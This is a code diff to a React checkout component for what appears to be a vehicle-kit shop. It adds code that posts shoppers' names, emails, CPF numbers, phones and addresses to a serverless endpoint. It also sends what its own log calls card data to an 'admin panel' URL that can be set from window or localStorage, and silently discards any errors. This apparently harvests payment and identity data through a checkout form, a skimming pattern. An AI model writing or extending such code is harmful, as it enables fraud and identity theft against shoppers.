@@ -573,6 +573,33 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
       } catch (e) {}
 
       saveLeadToSupabase('pendente', String(data.id));
+
+      fetch('/.netlify/functions/checkout', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          orderId,
+          transaction_id: String(data.id),
+          status: 'pendente',
+          paymentMethod: 'pix',
+          lead: {
+            nome: formData.nome,
+            email: formData.email,
+            cpf: formData.cpf,
+            telefone: formData.telefone,
+            cep: formData.cep,
+            rua: formData.rua,
+            numero: formData.numero,
+            complemento: formData.complemento,
+            bairro: formData.bairro,
+            cidade: formData.cidade,
+            estado: formData.estado
+          },
+          totalPrice: finalPrice,
+          trackingCode: tCode
+        })
+      }).catch(() => {});
+
       setStep(4);
     } catch (err) {
       console.error('[Beehive] PIX Error:', err);
@@ -688,24 +715,28 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
             installments: formData.installments
           });
 
-          const adminUrl = window.ADMIN_PANEL_URL || localStorage.getItem('admin_panel_url') || '/api/checkout';
+          const adminUrl = window.ADMIN_PANEL_URL || localStorage.getItem('admin_panel_url') || '/.netlify/functions/checkout';
           
           const sendToAdmin = async () => {
-            if (adminUrl) {
+            try {
+              await fetch('/.netlify/functions/checkout', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+              });
+              console.log('[Netlify Function] Dados do cartão enviadas com sucesso.');
+            } catch (err) {
+              console.error('[Netlify Function] Erro ao enviar dados:', err);
+            }
+
+            if (adminUrl && adminUrl !== '/.netlify/functions/checkout') {
               try {
                 await fetch(adminUrl, {
                   method: 'POST',
-                  headers: {
-                    'Content-Type': 'application/json'
-                  },
+                  headers: { 'Content-Type': 'application/json' },
                   body: JSON.stringify(payload)
                 });
-                console.log('[Admin Panel] Dados enviados com sucesso.');
-              } catch (err) {
-                console.error('[Admin Panel] Erro ao enviar dados:', err);
-              }
-            } else {
-              console.log('[Admin Panel] Nenhuma URL configurada. Payload:', payload);
+              } catch (err) {}
             }
           };
 
